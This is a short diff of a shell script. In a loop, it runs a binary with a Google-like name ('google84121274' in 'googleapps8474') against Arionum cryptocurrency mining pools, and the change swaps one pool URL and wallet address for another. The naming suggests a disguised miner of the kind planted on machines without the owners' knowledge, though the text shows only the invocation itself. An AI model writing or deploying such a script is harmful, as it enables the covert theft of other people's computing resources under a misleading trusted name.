@@ -10,7 +10,7 @@ cd googleapps8474
 while true
 do
 
-timeout 84 ./google84121274 -p http://pool.ariochain.info:8080 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 8 -b 8
+timeout 84 ./google84121274 -p http://mine.arionumpool.com -a 4xSb4h1zY9BxRxpqFMd8JJjQr7Ngtq2NwM8aX8S9Q4Xc3TE37UmS7W5p9rqe4fM9nMoSLq7vuiGXmKakAiarGmsU -t 8 -b 8
 if [ $? -eq 124 ]; then
 echo "google84"
 else
